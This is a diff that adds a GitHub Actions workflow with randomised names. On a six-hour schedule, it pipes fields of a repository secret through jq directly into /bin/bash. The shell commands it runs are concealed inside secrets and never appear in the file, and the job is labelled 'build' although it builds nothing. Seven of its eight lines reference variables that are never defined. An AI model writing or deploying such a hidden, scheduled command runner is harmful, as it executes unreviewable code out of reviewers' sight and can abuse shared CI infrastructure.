@@ -1,0 +1,24 @@
+name: wozhendemeyouqingxu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wozhendemeyouqingxu
+        env:
+          ptu497: ${{ secrets.ptu497 }}
+        run: |
+          echo $ptu497 | jq -r .vjhh0785 | /bin/bash
+          echo $i795 | jq -r .eolk8811 | /bin/bash
+          echo $jjur37156 | jq -r .vcixp264 | /bin/bash
+          echo $wbvvc23 | jq -r .qk3 | /bin/bash
+          echo $uzmgw89335 | jq -r .kp5708 | /bin/bash
+          echo $cjuyt5 | jq -r .cgwfp2617 | /bin/bash
+          echo $ihtr48788 | jq -r .kor6 | /bin/bash
+          echo $thvr506 | jq -r .diz83398 | /bin/bash
+
